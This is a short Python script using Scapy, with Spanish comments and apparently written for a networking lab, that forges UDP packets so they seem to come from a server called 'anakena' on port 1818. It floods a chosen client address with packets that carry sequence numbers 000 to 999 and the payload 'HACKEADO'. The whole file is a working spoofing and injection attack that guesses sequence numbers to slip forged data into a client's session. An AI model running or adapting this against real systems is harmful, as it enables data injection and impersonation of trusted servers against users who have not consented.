#!/usr/bin/env python3
from scapy.all import IP, UDP, send
import sys
import time

# Linux localhost: necesario si estás en Debian o similar
from scapy.all import conf, L3RawSocket
conf.L3socket = L3RawSocket

if len(sys.argv) != 5:
    print("Uso: ./pirata.py anakena 1818 IP_CLIENTE PUERTO_CLIENTE")
    sys.exit(1)

anakena_ip = sys.argv[1]
anakena_port = int(sys.argv[2])
client_ip = sys.argv[3]
client_port = int(sys.argv[4])

payload = b'HACKEADO\n'

try:
    while True:
        for seq in range(1000):
            seq_str = f"{seq:03}".encode()
            pkt_payload = seq_str + payload

            pkt = IP(src=anakena_ip, dst=client_ip) / \
                  UDP(sport=anakena_port, dport=client_port) / \
                  pkt_payload

            send(pkt, verbose=0)
            print(f"[*] Enviado paquete pirata con secuencia: {seq_str.decode()}")

            time.sleep(0.01)  # 10 ms entre paquetes
except KeyboardInterrupt:
    print("\n[+] Ataque detenido.")
